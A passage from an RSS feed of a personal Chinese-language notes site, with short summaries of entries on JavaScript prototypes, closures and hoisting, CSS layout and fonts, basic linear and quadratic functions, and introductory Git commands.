      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B/</guid>
      <description>原型 原型对象，它是只有函数才拥有的隐式属性（使用 null 作为构造函数的原型的情况下，原型不能通过自定义进行添加）
通过原型对象这种机制，可以使一个对象从其他的对象那里继承一属性或方法。
prototype 显式原型属性，每一个对象都有一个 prototype，这个属性指向该对象的原型对象。
它和proto指向的都是同一个原型对象。
我们一般通过prototype去操作一个对象的原型对象。而系统调用的时候，会通过proto去调用。
__proto__  隐式原型属性，每一个对象都有一个proto，这个属性指向该对象的原型对象。 proto 的指向（值）可以修改，即一个用构造函数创建出的对象实例的原型是可以通过该属性修改的。 当调用一个对象的属性时，如果这个对象没有这个属性，那么就会到构造该对象的构造函数的原型所指向的对象（可以称之为父对象）中去寻找这个属性，如果父对象也没有这个属性，则到该父对象的构造函数的原型所指向的对象（可以称之为为爷爷对象）里去寻找这个属性，如果还没找到，则继续往上找…，直到原型链终端为 Object.prototype；Object.prototype 中有一个 null，相当于到 null 中去取值，即调用一个对象所没有的值，会返回 undefined；这种通过属性 proto 连接原型对象直到 Object.prototype（null）的一条链为原型链。 通常情况，大部分对象最终都会继承自 Object.prototype，因为 Object.create() 方法中可以将 null 放进去当做原型。 在 JavaScript 中，null 与 undefined 没有原型且不是对象。  作用 可以让一个构造函数所创建的多个对象都可以使用公用的属性和方法。
声明一个构造函数之后，该构造函数中会有一个属性 prototype，这个属性指向的就是该构造函数对应的原型对象。
原型对象中有一个属性 constructor，该属性用于指向这个对象的构造函数。
// Demo.prototype = {} 是构造函数 Demo 的原型，它默认是一个空对象（原型对象） // 当构造函数 Demo 被定义完成时，同时该函的原型对象 Demo.prototype = {} 也被定义完成； // Demo.prototype.name = &amp;#34;原型的名字&amp;#34;; // Demo.prototype.size = &amp;#34;500&amp;#34;; // Demo.prototype.height = &amp;#34;1400&amp;#34;; // Demo.</description>
    </item>
    
    <item>
      <title>JavaScript 原型链</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B%E9%93%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B%E9%93%BE/</guid>
      <description>原型链 每个实例对象（ object ）都有一个私有属性（ proto ），用于指向它的构造函数的原型对象（prototype）；该原型对象也有一个自己的私有属性（proto ），层层向上直到原型对象 Object.prototype 为 null；而 null 没有原型，它作为这个原型链的终端，它的值为 undefined。
几乎所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例。
可以使用对象的属性 proto 实现继承。</description>
    </item>
    
    <item>
      <title>JavaScript 命名空间</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</guid>
      <description>命名空间 命名空间（package），它可以帮助我们更好地整理代码，并可避免变量命名冲突。
简单地说，我们可以创建一个简单对象字面量来打包所有的相关函数和变量。这个简单对象字面量模拟了命名空间的作用。
作用 私有化变量 function Demo() { 	var healthy = 0; 	// 该变量为私有化变量，这个变量只能通过构造函数的指定方法进行调用， 	// 不能直接作为对象的属性或变量进行调用。 	this.cure = function () { 	healthy++; 	};  	this.injured = function () { 	healthy--; 	};  	this.view = function () { 	console.log(healthy); 	}; }  var demo = new Demo();  demo.view(); // 返回 0，调用构造函数的属性 view。 demo.cure(); // 调用构造函数的属性 cure。，使变量 healthy 自增 1。 demo.</description>
    </item>
    
    <item>
      <title>JavaScript 属性调用</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%B1%9E%E6%80%A7%E8%B0%83%E7%94%A8/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%B1%9E%E6%80%A7%E8%B0%83%E7%94%A8/</guid>
      <description>属性调用 通常调用属性的格式一般为 fun.arr，实际上系统会隐式将 fun.arr 变为 fun[&amp;ldquo;arr&amp;rdquo;]，因为前者调用更加灵活且简洁。
var demo = { 	wife1: { name: &amp;#39;lei&amp;#39; }, 	wife2: { name: &amp;#39;zheng&amp;#39; }, 	wife3: { name: &amp;#39;xing&amp;#39; }, 	wife4: { name: &amp;#39;zhu&amp;#39; }, 	fun: function (num) { 	var a = [&amp;#39;wife&amp;#39; + num]; 	console.log(a); 	return this[&amp;#39;wife&amp;#39; + num]; 	// 看不太懂 	}, };  demo.fun(1); demo.fun(2); demo.fun(3); demo.fun(4); </description>
    </item>
    
    <item>
      <title>JavaScript 开发原则</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%80%E5%8F%91%E5%8E%9F%E5%88%99/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%80%E5%8F%91%E5%8E%9F%E5%88%99/</guid>
      <description>开发原则 渐进增强 不要使用 JavaScript 代码添加网页的核心内容，应该先保证核心内容脱离与 CSS 与 JavaScript 代码之外。
平稳退化 确保网页在没有 JavaScript 与 CSS 的情况下也能使用核心功能，而且渐进增强的实现必然支持平稳退化。
向后兼容 使用对象检测的方式来检测浏览器对 JavaScript 的支持程度，确保老版本的浏览器不会因为不支持某些 JavaScript 代码而报错。
性能考虑 减少访问 DOM 的和文档中标记的元素；过多的页面元素只会增大 DOM 树的规模。
将多个 JavaScript 文件合并为一个；减少加载页面时发送的请求数量。
压缩已完成的 JavaScript 脚本；将文件中的不必要的字节（空格、注释、回车符）统统删除，从而减少整体文件大小。</description>
    </item>
    
    <item>
      <title>JavaScript 数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>原始值和引用值 在 ECMAScript 中，数据类型有两种，即原始类型和引用类型。
原始类型 一种非对象也没有方法和属性的数据类型，也叫基本类型（基本数值或基本数据类型）。所有的原始值都是不可改变的。
Number 数值，用整数或浮点数表示，它允许任意位的小数。
String 字符串，由零个或多个字符构成，它必须被包含在双引号或双引号内。
与数组一样的是，字符串中的每个字符都有一个下标，这些下标从 0 开始。因此，它有属性 length。
Boolean 布尔，表示一个逻辑值，只有 true 或 false 两个值。
BigInt 任何精度格式的整数，是一种比 Number 数据类型支持的范围更大的整数值。用于安全地存储和操作大整数。
Symbol 符号，它是唯一的并且是不可修改的。
undefined 未定义，它只有一个值 undefined，指一个声明未描述的变量的初始值或一个变量直接赋值为 undefined，或没有实际参数的形式参数
Null 空指针，它也只有一个值 null，表示一个不存在的或无效 object 和地址引用。因为历史遗留性问题，它是的数据类型为 Object。
原始值的储存原理 a = 10; // 在栈内存第一层创建一个变量 a ，然后将数值 10 放进变量 a 中。 // 栈内存： // a ： 10 var b = a; // 在栈内存第二层创建一个变量 b，然后将变量 a 中的数值 10 拷贝到变量 b 中。 // 栈内存： // a ：10 // 拷贝变量 10 // b ：10 a = 20; // 在栈内存第三层重新创建一个变量 a，然后将数值 10 放入这个第三层的变量 a 中，之后关闭在第一层的变量 a。 // 栈内存： // a ：10（已关闭） // b ：10 // a ：20 （新的变量 a） 引用类型 引用类型都是对象，每个对象都有属性和方法。它指的是存储在堆内存中的实际对象。每一个引用变量中都存放着指针，这个指针指向其堆内存中的实际对象。</description>
    </item>
    
    <item>
      <title>JavaScript 继承方式</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</guid>
      <description>继承方式 原型链继承 缺点
会使一个对象过多继承一些没用或不需要的属性，则会导致代码的执行效率大大降低。反对反对反对法大幅度发反对发的
Grand.prototype.blue = &amp;#39;blue&amp;#39;;  function Grand() {}  var grandfather = new Grand();  Father.prototype = grandfather;  function Father() { 	this.red = &amp;#39;red&amp;#39;; 	this.money = { 	card: &amp;#39;pencil&amp;#39;, 	}; 	this.value = &amp;#39;100&amp;#39;; }  var father = new Father();  Son.prototype = father;  function Son() { 	this.orange = &amp;#39;orange&amp;#39;; } var son = new Son();  console.log(son.orange);  // 返回 son 的原型 father 上的 red。 console.</description>
    </item>
    
    <item>
      <title>JavaScript 节点</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E8%8A%82%E7%82%B9/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E8%8A%82%E7%82%B9/</guid>
      <description>节点 在文档中，几乎每一样东西都是一个节点（Node），包括空格和换行符都会被解释为节点。
文档的根节点不是 html，而是 document。
分类 元素节点 文档中的元素，nodeType 的值为 1。
属性节点 文档中元素节点的属性，属性节点都被包含在元素节点中。
nodeType 的值为 2。
文本节点 文档中元素所包含的文本。 nodeType 的值为 3。
注释节点 文档中的注释。
nodeType 的值为 8.
document 节点 nodeType 的值为 9。
属性 每一个节点都有四个基本属性。
nodeValue 返回或设置指定点的值。
只用文本节点或注释节点才有 nodeValue。
而其他节点的 nodeValue 是 null 。
nodeName 返回指定节点的大写字母形式的节点名，它是一个只读属性。
nodeType 返回指定节点的类型，只读属性。
元素节点返回 1。
属性节点返回 2。
文本节点返回 3。
注释节点返回 8。
document 节点返回 9。
attributes 返回指定节点的所有属性节点。
方法 hasChildNodes() 判断一个元素是否包含子节点，返回一个布尔值。</description>
    </item>
    
    <item>
      <title>JavaScript 运算符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>运算符 算数运算符 算术运算符都会将操作数用 Number() 隐式转换，然后再进行运算；若遇到无法转换的值，则会返回 number 类型的 NaN。
++ a++ 或 ++a，自增（递增）。使操作数加 1，并返回自增后的值。
操作数前置或后置
若位于数值的之后（a++），则会自增之前返回数值。
若位于数值的之前（++a），则会自增之后返回数值。
&amp;ndash; a&amp;ndash; 或 &amp;ndash;a， 递减（自减）。使操作数减 1，并返回自减后的值。
操作数前置或后置
若位于数值的之后（a&amp;ndash;），则会递减之前返回数值。
若位于数值的之前（&amp;ndash;a），则会递减之后返回数值。
比较运算符 JavaScript 有两种比较方式：严格比较和转换类型比较。
对于严格比较运算符（===）来说，仅当两个操作数的类型相同且值相等为 true。
对于比较运算符（==）来说，会先将将两个操作数转换成相同的类型，再进行值的比较运算。
对于关系运算符（ &amp;lt;=）来说，会先将操作数转为原始值，使它们类型相同，再进行值的比较运算。
字符串比较则是使用基于标准字典的 Unicode 值来进行比较的。
原始值比较的是值，引用值比较的是引用地址。
In 用于判断一个对象的指定的属性是否在该对象或其原型链中，在则 in 运算符返回 true，不在则返回 false。
Instanceof 用于判断一个对象是否是由指定构造函数构造出来的。
// 如果 mycar 不是 vue 的实例对象 if (!(mycar instanceof Car)) { 	console.log(&amp;#39;No&amp;#39;); } 也可以用于判断一个实例对象的原型链中有没有另一个变量的原型。
function Car(make, model, year) { 	this.make = make; 	this.</description>
    </item>
    
    <item>
      <title>JavaScript 链式调用</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8/</guid>
      <description>链式调用 模仿一个 jQuery 链式调用的方式。
var demo = { 	a: function () { 	console.log(123); 	return this; 	// 将函数自身返回。 	},  	b: function () { 	console.log(456); 	return this; 	// 将函数自身返回。 	},  	c: function () { 	console.log(789); 	return this; 	//将函数自身返回。 	}, }; demo.a().b().c(); // 呈链式(连续)的调用对象 demo 的属性。 </description>
    </item>
    
    <item>
      <title>JavaScript 闭包</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E9%97%AD%E5%8C%85/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E9%97%AD%E5%8C%85/</guid>
      <description>闭包 在函数（父函数）中创建另一个函数（子函数）时；当子函数被父函数 return 到了外部时，会生成闭包。
生成了闭包后，虽然父函数的 AO 已经被释放了，但子函数却保存了父函数的 AO，且这个 AO 不会因为父函数的执行完毕而被释放，因为父函数的 AO 已经被子函数给保存了起来，且可以随意调用。
闭包的优缺点 优点 避免全局变量的污染。
使变量长期储存在内存中。
缺点 使用不当会导致原有的作用域链不释放，造成内存泄露（过多占用内存的剩余空间，导致可用空间越来越少）。
function demo() { 	function test() { 	var d = 345; 	console.log(c); 	// 虽然函数 test 中没有变量 c，但因为函数 test 可以使用函数 demo 的 AO， 	// 所以它会到函数 demo 的作用域中去寻找变量 c，然后返回 123 	} 	var c = 123; 	return test; 	// 将函数 test 返回，即将函数 test 与它的作用域一起保存到了外部， 	// 使的函数 demo 可以使用函数 test 的 AO } var e = demo(); // 用变量 e 接收函数 demo 的返回值，也就是接收函数 test 以及它的 AO e(); // 调用变量 e，即相当于执行函数 demo 的返回值 // 父函数 demo 执行完毕后，释放了自己的 AO，但子函数 test 在这之前已经将父函数 demo 的 AO 保存了起来， // 所以它会到函数 demo 的作用域中去寻找变量 c，然后返回 123 function demo() { 	var b = &amp;#39;apple&amp;#39;; 	var obj = { 	c: function () { 	// 给对象 obj 添加一个属性 c ，属性值为一个函数 	if (b !</description>
    </item>
    
    <item>
      <title>JavaScript 预编译</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%A2%84%E7%BC%96%E8%AF%91/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%A2%84%E7%BC%96%E8%AF%91/</guid>
      <description>预编译 JavaScript 是脚本语言，因此不会进行传统的预编译，但它会经过一个特殊的预编译过程，这个预编译过程发生在代码执行前的极短时间内。
预编译发生在代码执行之前的一瞬间，用于在内存中创建一些空间来存储一些变量与函数；预编译时，会无视 if 语句中的条件，会直接将 if 语句中的代码块内的变量的声明与函数声明进行提升。
函数声明提升 定义一个函数时，该函数会被提升到当前作用域链的顶端，即调用该函数时，不管在哪调用该函数，都可以调用成功；但函数表达式并不会。
变量声明提升 使用 var 声明的变量，不管在这之前还是之后调用该变量，并不会报错，会返回 undefined。
暗示全局变量 暗示全局变量（imply global），一个变量未声明就赋值，那么此变量就是 window（全局对象）的属性； 任何全局变量，都是 window 的属性，即可以通过 window 对象调用全局变量。window 就是全局的域，它包括了全局变量和全局函数。
暗示全局变量不会进行变量声明提升。
a = 10; // 一个变量未声明就赋值，那么此变量就是 window（全局对象）的属性，也叫暗示全局变量 // 相当于 window.a = 10; // 相当于 window = { 	a: 10, };  //一切声明了的全局变量，都是 window 的属性 var b = 20; // 相当于 window.b = 20; // 相当于 window = { 	b: 20, }; // 调用变量 b，相当于调用全局对象 window 的属性 b，即 console.</description>
    </item>
    
    <item>
      <title>Math 一次函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/</guid>
      <description>一次函数 解析式 $ y = kx + b$（$k$ 与 $b$ 为常数 $k \neq 0$），当 $b$ 等于 $0$ 时，这个函数为正比例函数。
图像  一次函数的图像都是一条直线，因此只需要两点就可以画出。 $ y = kx + b$ 的图像可以由 $y = kx$ 向上或向下平移 |b| 个单位得到，当 $b$ 大于 0 则向上；小于 0 则向下。  与方程、不等式的关系  因为任何一个一元一次方程都可以变为 $ax + b = 0$ 的形式，所以解这个一元一次方程，相当于求与这个一元一次方程对应的 $y = ax + b$ 的函数值为 $0$ 时，自变量 $x$ 的值；例如： $3x + 5 = 6 =&amp;gt; 3x + 5 - 6$。 每个一含有 $x$ 和 $y$ 的二元一次方程都对应一个一次函数，同样也对应一条在坐标系中的直线，因此这条线上的每一个点（$x$，$y$）都是这个二元一次方程的解。 二元一次方程组则对应两个一次函数，同时也对应两条在坐标系中的直线，因此解这个二元一次方程组，相当于找出这两条直线在坐标系中的交点的坐标。  </description>
    </item>
    
    <item>
      <title>Math 二次函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%BA%8C%E6%AC%A1%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%BA%8C%E6%AC%A1%E5%87%BD%E6%95%B0/</guid>
      <description>二次函数 解析式 一般式：$y = ax^2 + bx + c$
顶点式：$y = a(x - h)^2 + k$
从 $y = ax^2$ 的图像可以看出  当 $a &amp;gt; 0$ 时，开口向上；当 $a &amp;lt; 0$ 时，开口向下，$|a|$越大，则图像的开口越小。 如果 $a &amp;gt; 0$ ，当 $x &amp;lt; 0$ 时，$y$ 随 $x$ 的增大而减小，当 $x &amp;gt; 0$ 时，$y$ 随 $x$ 的增大而增大；如果 $a &amp;lt; 0$ 时，当 $x &amp;gt; 0$ 时，$y$ 随 $x$ 的增大而减小。  从 $y = ax^2 + k$ 的图像可以看出 当 $k &amp;gt; 0$ 时，图像向上平移 $k$ 个单位；当 $k &amp;lt; 0$，图像则向下平移 $|k|$ 个单位长度。</description>
    </item>
    
    <item>
      <title>Math 反比例函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E5%8F%8D%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E5%8F%8D%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</guid>
      <description>反比例函数 解析式 $y = \frac{k}{x}$
图像 当 $k$ &amp;gt; 0，时，图像位于一、三象限，且 $y$ 随 $x$ 增大而减小。
当 $k$ &amp;lt; 0，时，图像位于二、四象限，且 $y$ 随 $x$ 增大而增大。</description>
    </item>
    
    <item>
      <title>Math 正比例函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E6%AD%A3%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E6%AD%A3%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</guid>
      <description>正比例函数 解析式 $y = kx$（$k$ 为常数，$k$ ≠ $0$），其中 $k$ 叫做比例系数。</description>
    </item>
    
    <item>
      <title>同时推送到Gtihub和Gitee</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%8C%E6%97%B6%E6%8E%A8%E9%80%81%E5%88%B0gtihub%E5%92%8Cgitee/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%8C%E6%97%B6%E6%8E%A8%E9%80%81%E5%88%B0gtihub%E5%92%8Cgitee/</guid>
      <description>同时推送到 Gtihub 和 Gitee 修改 Git 的配置文件config
找到**[remote &amp;ldquo;origin&amp;rdquo;]下的url**
增加需要添加的远程库 url 即可</description>
    </item>
    
    <item>
      <title>安装 Git</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%AE%89%E8%A3%85-git/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%AE%89%E8%A3%85-git/</guid>
      <description>安装 Git 官网下载并安装 Git (git-scm.com)，下载完成后，默认选项安装即可。
安装完成后，右击后在菜单中选择 Git Bash ，蹦出一个类似命令行窗口的东西，就说明 Git 安装成功了！
Rainy@Rainy MINGW64 /e/Rainy 配置个人信息 因为 Git 是分布式版本控制系统，所以，每台设备都必须自报家门，也就是在命令行输入你的 Github 用户名和 Email 地址。
首先，找一个合适的文件夹，右击 Git Bash，在命令行输入
git config --global user name &amp;#34;Your Github UserName&amp;#34; git config --global user email &amp;#34;Your Github Email&amp;#34; 注意git config命令的--global参数，用了这个参数，表示你这台设备上所有的 Git 仓库都会使用这个配置，当然也可以对某个仓库指定不同的 UserName 和 Email 地址。</description>
    </item>
    
    <item>
      <title>Css 实现居中</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%AE%9E%E7%8E%B0%E5%B1%85%E4%B8%AD/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%AE%9E%E7%8E%B0%E5%B1%85%E4%B8%AD/</guid>
      <description>实现居中 绝对定位 兼容性不错的主流 css 绝对定位居中的用法：
width: 600px; height: 400px; position: absolute; left: 50%; top: 50%; margin-top: -200px; /* 高度的一半 */ margin-left: -300px; /* 宽度的一半 */ 绝对定位 transform 中 translate 偏移的百分比值是相对于自身大小的，可以这样实现 css 绝对定位居中，给子元素应用以下样式，将子元素居于父元素正中间，注意：这个方法有 bug。
position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); 弹性布局 给父元素应用以下样式，将子元素居于父元素正中间。
display: flex; flex-direction: row; justify-content: center; align-items: center; display: flex; flex-direction: column; justify-content: center; align-items: center; 文本实现垂直居中 display: flex; align-items: center; </description>
    </item>
    
    <item>
      <title>Css 盒子类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E7%B1%BB%E5%9E%8B/</guid>
      <description>盒子类型 行盒   display 属性为 inline 的元素是行盒，也叫行级元素；如 span、strong、button、em、a、img、video、audio。
  文字一定是行盒（文字会产生匿名行盒将其包裹）。
  内部产生参考线：一个元素中包含行盒，通常会给行盒设置 vertical-align:baseline，这会导致两个元素的参考线对齐。
  同一个包含块中，连续多个行盒水平依次排列，剩余空间排列不下，才会换行。
  行盒不能包含块盒（a 元素除外）。
  设置 width 和 height 无效；调整行盒的 width 与 height 应使用字体大小、行高、字体类型等间接调整。
  产生空白合并：代码中的连续空白字符，在页面显示时，会被合并为一个空格。
  设置内外边距及边框，水平方向有效，垂直方向只会影响元素的背景，不会影响其他盒子。
  内部包含行块盒或可替换元素，行盒的高度只和文字内容的字体大小有关系，和行块盒或可替换元素无关。
  块盒  display 属性为 block 的元素，也叫块级元素；如 div、h1~h6、pre、ul、li、p。 同一个包含块中，每个块盒独占一行。 p 元素不能包含 div 元素。  行块盒  display 属性为 inline-block 的元素，也叫行块级元素；没有默认值为 inline-block 的元素。 同一个包含块中，连续的多个行块盒水平依次排列。 行块盒内部一定会产生参考线。 产生空白合并  </description>
    </item>
    
    <item>
      <title>Css 高斯模糊</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E9%AB%98%E6%96%AF%E6%A8%A1%E7%B3%8A/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E9%AB%98%E6%96%AF%E6%A8%A1%E7%B3%8A/</guid>
      <description>高斯模糊 backdrop-filter: blur(0.5rem); </description>
    </item>
    
    <item>
      <title>Css 字体</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%AD%97%E4%BD%93/</link>
      <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%AD%97%E4%BD%93/</guid>
      <description>字体 参考线 当制作文字时，会出现几根参考线。不同的文字类型，参考线位置、距离都不一样，同一种文字类型，参考线一致。
组成
 text_top ascent，顶线 super，上基线 baseline，基线 sub，下基线 text_bottom descent，底线  决定因素
 font-family：定义参考线的相对距离。 font-size：定义参考线之间的距离。 line-height：定义参考线的顶部空隙与底部空隙。  元素的基线 img：基线位置位于 img 的下外边距的最底边。
from：基线位于其内容的底边。
行块盒：父元素内部包含行块盒（高度自适应） ，会因为行块盒最后一行有 line-box，则会导致行块盒用最后一行的基线作为整个父元素的基线。若父元素中没有行盒，则使用父元素的下外边距作为基线。
font-size 用该属性设置字体大小时，改变的是文字的相对大小，也叫字体框大小。
制作文字时，文字外面会有一个字体框，不同的文字的字体框，大小也不一样；即设置文字的小大，本质改变的是文字的相对大小。
相对大小
若一个文字的相对大小（字体框大小）为 2048 时，那么它顶线到基线的距离为 1884，底线到基线的距离为 514，则顶线到底线的距离为 1884 + 514 = 2398。（可以拙见为一个字体的高为 2048，那么该字体占的实际区域是 2390，因此某些字体会有默认边距）
文字顶线到底线的距离，叫做文字的实际大小（content-area），也叫内容区。即行盒的背景，填充的是文字的实际大小。因此当我们给行盒设置背景时，会导致行盒上下有留白。即上部分留白 + 行盒背景 + 下部分留白 = 文字的相对大小。
line-height 用于设置多行元素的空间量。
top：文字顶线向上延申的空间。
bottom：文字底线向下延申的空间。
空隙  这两个空间（top 与 bottom）的空间量一定相等，这两个空间叫做空隙（line gap）。 通常，空隙是字体设计者决定的，因此有些字体没有空隙，但有的字体有空隙，有的字体空隙是负数。  虚拟区  top 到 botoom 的距离，叫做虚拟区（virtual-area），有的虚拟区和内容区相等，有的虚拟区比内容区小，但大部分虚拟区都比内容区大；因此设置行高大小就等于设置虚假区的大小。 因为虚拟区上下两边都相等，所以字体的实际大小在虚拟区之间。  line-box  line-box（行框）是承载文字内容的必要条件，如果没有行框，文字将无法显示。 当有多行行盒排列时，每一行的区域就叫做 line-box，line-box 的顶边是该行所有行盒的最顶边，底边是该行行盒的最低底边。即一个行盒的实际占用高度是通过 line-box 计算的。  不生成 line-box 的情况</description>
    </item>
    
    <item>
      <title>Git 删除文件</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/</guid>
      <description>删除文件 git rm FileName 命令git rm用于删除一个文件。
如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容
删错文件怎么办 有时候，你误删了一个文件 FileName，但因为版本库里还有，所以可以使用git checkout -- FileName把误删的文件恢复到最新版本
git checkout -- FileName </description>
    </item>
    
    <item>
      <title>Css 文本溢出处理</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E5%A4%84%E7%90%86/</link>
      <pubDate>Wed, 13 Oct 2021 00:00:00 +0000</pubDate>
      
